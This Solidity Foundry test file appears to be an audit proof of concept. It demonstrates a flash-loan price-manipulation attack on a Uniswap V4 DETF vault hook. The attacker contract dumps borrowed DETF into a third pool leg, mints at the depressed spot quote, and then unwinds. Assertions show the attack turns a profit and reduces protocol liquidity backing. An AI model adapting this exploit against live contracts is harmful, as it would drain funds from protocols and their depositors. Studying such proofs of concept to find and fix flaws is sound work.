// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {ExchangeInAmount} from "contracts/utils/ExchangeInAmount.sol";

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {IUniswapV4Detf} from
    "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/interfaces/IUniswapV4Detf.sol";
import {IVaultFeeOracleManager} from "contracts/interfaces/IVaultFeeOracleManager.sol";
import {IVaultFeeOracleQuery} from "contracts/interfaces/IVaultFeeOracleQuery.sol";
import {TestBase_UniswapV4Detf_Weighted} from
    "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/TestBase_UniswapV4Detf_Weighted.sol";

interface IHookExitPreview {
    function previewExitProportional(uint256 shares) external view returns (uint256[] memory amounts);
}

/// @notice Simulated flash lender of DETF (an honest holder lending inventory). Requires principal + fee back in-tx.
contract DetfFlashLender {
    IERC20 public immutable detf;
    uint256 public constant FEE_BPS = 10; // 0.10%

    constructor(IERC20 detf_) { detf = detf_; }

    function flashLoan(uint256 amount, bytes calldata data) external {
        uint256 before_ = detf.balanceOf(address(this));
        uint256 fee_ = amount * FEE_BPS / 10_000 + 1;
        detf.transfer(msg.sender, amount);
        DetfAttacker(msg.sender).onFlashLoan(amount, fee_, data);
        require(detf.balanceOf(address(this)) >= before_ + fee_, "flash not repaid");
    }
}

/// @notice Unprivileged attacker. Only public entrypoints of the hook and the DETF.
contract DetfAttacker {
    IStandardExchangeIn immutable detfX;
    IUniswapV4Detf immutable detfI;
    IERC20 immutable detf;
    address immutable hook;
    IERC20 immutable p0; // mint token
    IERC20 immutable p1; // third leg
    DetfFlashLender immutable lender;

    uint256 public minted;
    bool public gateOpenAtMint;

    constructor(address detf_, address hook_, IERC20 p0_, IERC20 p1_, DetfFlashLender lender_) {
        detfX = IStandardExchangeIn(detf_);
        detfI = IUniswapV4Detf(detf_);
        detf = IERC20(detf_);
        hook = hook_;
        p0 = p0_;
        p1 = p1_;
        lender = lender_;
        IERC20(detf_).approve(hook_, type(uint256).max);
        p0_.approve(hook_, type(uint256).max);
        p1_.approve(hook_, type(uint256).max);
        p0_.approve(detf_, type(uint256).max);
    }

    function _dl() internal view returns (uint256) { return block.timestamp + 1 hours; }

    function _hookDetf() internal view returns (uint256) { return detf.balanceOf(hook); }

    function _sellDetf(IERC20 out_, uint256 amt) internal {
        while (amt > 0) {
            uint256 c = _hookDetf() / 5;
            if (c > amt) c = amt;IStandardExchangeIn(hook).exchangeIn(detf, c, out_, 0, address(this), false, _dl());
            amt -= c;
        }
    }

    function _buyDetfWith(IERC20 in_, uint256 amt) internal {
        while (amt > 0) {
            uint256 c = _hookDetf() / 10;
            if (c > amt) c = amt;
            IStandardExchangeOut(hook).exchangeOut(in_, type(uint256).max, detf, c, address(this), false, _dl());
            amt -= c;
        }
    }

    /// @param delta DETF to dump into the third leg (0 = control, no flash loan)
    /// @param a pair0 used to mint
    function run(uint256 delta, uint256 a) external {
        if (delta == 0) {
            _core(0, 0, a);
        } else {
            lender.flashLoan(delta, abi.encode(a));
        }
    }

    function onFlashLoan(uint256 amount, uint256 fee, bytes calldata data) external {
        require(msg.sender == address(lender), "lender only");
        uint256 a = abi.decode(data, (uint256));
        _core(amount, fee, a);
        detf.transfer(address(lender), amount + fee);
    }

    function _core(uint256 delta, uint256 fee, uint256 a) internal {
        uint256 p1Start = p1.balanceOf(address(this));
        // 1) dump borrowed DETF into the third leg (DETF -> pair1). Gate for pair0 only reads pair0 leg.
        if (delta > 0) _sellDetf(p1, delta);
        // 2) mint with pair0 at the depressed spot quote
        gateOpenAtMint = detfI.isMintingAllowed(p0);(minted,) = detfX.exchangeIn(p0, a, detf, 0, address(this), false, _dl());
        // 3) buy back the dumped DETF (+ loan fee) with pair1
        if (delta > 0) _buyDetfWith(p1, delta + fee);
        // 4) sell all freely owned DETF for pair0
        uint256 keep = delta + fee;
        uint256 bal = detf.balanceOf(address(this));
        if (bal > keep) _sellDetf(p0, bal - keep);
        // 5) restore pair1 inventory: buy any pair1 deficit with pair0, or sell any surplus for pair0
        uint256 p1Now = p1.balanceOf(address(this));
        if (p1Now < p1Start) {
            IStandardExchangeOut(hook).exchangeOut(p0, type(uint256).max, p1, p1Start - p1Now, address(this), false, _dl());
        } else if (p1Now > p1Start) {IStandardExchangeIn(hook).exchangeIn(p1, p1Now - p1Start, p0, 0, address(this), false, _dl());
        }
    }
}

contract DetfSpotMintTest is TestBase_UniswapV4Detf_Weighted {
    DetfFlashLender lender;
    address honestMinter = address(0xBEEF01);

    function _pairBacking() internal view returns (uint256 p0Amt, uint256 p1Amt, uint256 detfAmt) {
        address hook_ = detfInfo.hook();
        address bnft = detfInfo.bondNftVault();
        uint256 lp = IERC20(hook_).balanceOf(detf) + (bnft == address(0) ? 0 : IERC20(hook_).balanceOf(bnft));
        uint256[] memory amts = IHookExitPreview(hook_).previewExitProportional(lp);
        // tokens sorted: figure index per token
        address[] memory toks = new address[](3);
        toks[0] = detf; toks[1] = address(pair0); toks[2] = address(pair1);
        _sortInPlace(toks);
        for (uint256 i; i < 3; ++i) {
            if (toks[i] == address(pair0)) p0Amt = amts[i];
            else if (toks[i] == address(pair1)) p1Amt = amts[i];
            else detfAmt = amts[i];
        }
    }

    function _setupHonest() internal {
        // Deployment-matching fee config (FixtureEconomics: DEX_SWAP_FEE=3e14, SEIGNIORAGE=5e16), set by owner pre-attack.
        console2.log("fixture dexSwapFee(hook)", IVaultFeeOracleQuery(address(indexedexManager)).dexSwapFeeOfVault(detfInfo.hook()));
        console2.log("fixture seigniorage(detf)", IVaultFeeOracleQuery(address(indexedexManager)).seigniorageIncentivePercentageOfVault(detf));
        vm.startPrank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setVaultDexSwapFee(detfInfo.hook(), 3e14);
        IVaultFeeOracleManager(address(indexedexManager)).setDefaultSeigniorageIncentivePercentage(5e16);
        vm.stopPrank();
        console2.log("deployed dexSwapFee(hook)", IVaultFeeOracleQuery(address(indexedexManager)).dexSwapFeeOfVault(detfInfo.hook()));
        console2.log("deployed seigniorage(detf)", IVaultFeeOracleQuery(address(indexedexManager)).seigniorageIncentivePercentageOfVault(detf));
        // Honest bonder seeds the reserve (normal first bond).
        _fundActor(detf, detfUser, 40_000 ether);
        _firstBond(1_000 ether);
        require(detfInfo.isReserveLive(), "live");
        // Honest minter acquires DETF via normal mints; that inventory is lent via the flash lender.
        lender = new DetfFlashLender(IERC20(detf));
        pair0.mint(honestMinter, 1_000_000 ether);
        vm.startPrank(honestMinter);
        pair0.approve(detf, type(uint256).max);
        for (uint256 i; i < 14; ++i) {detfExchangeIn.exchangeIn(IERC20(address(pair0)), 100 ether, IERC20(detf), 0, honestMinter, false, block.timestamp + 1 hours);
        }
        IERC20(detf).transfer(address(lender), IERC20(detf).balanceOf(honestMinter));
        vm.stopPrank();
    }

    function _log(string memory tag) internal view {
        address hook_ = detfInfo.hook();
        console2.log(tag);
        console2.log("  hook DETF bal", IERC20(detf).balanceOf(hook_));
        console2.log("  hook se0 bal ", IERC20(se0).balanceOf(hook_));
        console2.log("  hook se1 bal ", IERC20(se1).balanceOf(hook_));
        console2.log("  DETF supply  ", IERC20(detf).totalSupply());
        console2.log("  synthetic    ", detfInfo.syntheticPrice());
        console2.log("  mintAllowed p0", detfInfo.isMintingAllowed(IERC20(address(pair0))));
        console2.log("  quote 10 p0->DETF", ExchangeInAmount.previewOut(IStandardExchangeIn(hook_), IERC20(address(pair0)), 10 ether, IERC20(detf)));
    }

    function _runCase(uint256 delta, uint256 a) internal returns (int256 pnl0, uint256 backBefore, uint256 backAfter, uint256 mintedOut) {
        DetfAttacker atk = new DetfAttacker(detf, detfInfo.hook(), IERC20(address(pair0)), IERC20(address(pair1)), lender);
        pair0.mint(address(atk), a + 50 ether); // attacker's own pair0 capital (accounted)
        pair1.mint(address(atk), 50 ether);     // small pair1 float, must be restored
        uint256 p0Before = pair0.balanceOf(address(atk));
        uint256 p1Before = pair1.balanceOf(address(atk));
        uint256 lenderBefore = IERC20(detf).balanceOf(address(lender));
        (uint256 b0, uint256 b1,) = _pairBacking();
        backBefore = b0 + b1;
        uint256 supplyBefore = IERC20(detf).totalSupply();

        vm.prank(address(0xA77AC4), address(0xA77AC4));
        atk.run(delta, a);

        assertGe(pair1.balanceOf(address(atk)), p1Before, "pair1 restored");
        assertEq(IERC20(detf).balanceOf(address(atk)), 0, "no DETF left with attacker");
        assertGe(IERC20(detf).balanceOf(address(lender)), lenderBefore, "loan repaid + fee");
        pnl0 = int256(pair0.balanceOf(address(atk))) - int256(p0Before);
        (b0, b1,) = _pairBacking();
        backAfter = b0 + b1;
        mintedOut = atk.minted();
        console2.log("  delta", delta, "a", a);
        console2.log("  gate open at mint", atk.gateOpenAtMint());
        console2.log("  user DETF minted", mintedOut);
        console2.log("  DETF supply delta", IERC20(detf).totalSupply() - supplyBefore);
        console2.log("  attacker pair0 PnL (wei):");
        console2.logInt(pnl0);
        console2.log("  protocol-LP pair backing before", backBefore);
        console2.log("  protocol-LP pair backing after ", backAfter);
    }

    function test_detfSpotMint_thirdLegDump() public {
        _setupHonest();
        _log("== after honest setup ==");
        uint256 hookDetf = IERC20(detf).balanceOf(detfInfo.hook());
        uint256 lenderBal = IERC20(detf).balanceOf(address(lender));
        console2.log("lender DETF", lenderBal);
        uint256 a = 60 ether;

        uint256 snap = vm.snapshotState();
        console2.log("== CONTROL: no manipulation ==");
        (int256 pnlCtrl,,,) = _runCase(0, a);
        vm.revertToState(snap);

        uint256 delta = hookDetf < lenderBal ? hookDetf : lenderBal;
        console2.log("== ATTACK: dump delta DETF into third leg ==");
        (int256 pnlAtk, uint256 backB, uint256 backA,) = _runCase(delta, a);

        assertLe(pnlCtrl, 0, "control not profitable");
        assertGt(pnlAtk, 0, "attack profitable");
        assertLt(backA, backB, "protocol LP pair backing decreased");
    }

    /// @notice Reviewer sweep: profit vs flash size (fraction of hook DETF balance) and mint size.
    function test_reviewer_sweep() public {
        _setupHonest();
        uint256 hookDetf = IERC20(detf).balanceOf(detfInfo.hook());
        uint256[4] memory fr = [uint256(5), 10, 25, 50];
        uint256[2] memory as_ = [uint256(20 ether), 60 ether];
        for (uint256 j; j < 2; ++j) {
            for (uint256 i; i < 4; ++i) {
                uint256 snap = vm.snapshotState();
                uint256 d = hookDetf * fr[i] / 100;
                console2.log("== SWEEP pct of hook DETF", fr[i], "mint a", as_[j]);
                _runCase(d, as_[j]);
                vm.revertToState(snap);
            }
        }
    }
}
